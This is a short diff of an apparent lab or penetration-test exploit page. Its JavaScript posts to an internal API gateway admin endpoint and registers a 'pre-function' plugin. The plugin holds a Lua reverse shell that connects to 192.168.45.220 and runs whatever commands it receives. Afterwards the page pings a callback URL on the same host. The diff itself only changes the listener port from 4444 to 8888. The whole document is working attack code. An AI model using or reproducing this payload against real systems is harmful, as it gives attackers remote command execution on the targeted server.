@@ -26,7 +26,7 @@ function createPlugin() {
     fetch("http://172.16.16.2:8001/services/supersecret/plugins", { 
       method: "post",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({"name":"pre-function", "config" :{ "access" :[ "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.220',4444);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();" ]}})
+      body: JSON.stringify({"name":"pre-function", "config" :{ "access" :[  "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.220',8888);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"  ]}})
     }).then(function (callback) {
       fetch("http://192.168.45.220/callback?setupComplete");
     });  
@@ -37,3 +37,4 @@ function createPlugin() {
 <div></div>
 </body>
 </html>
+
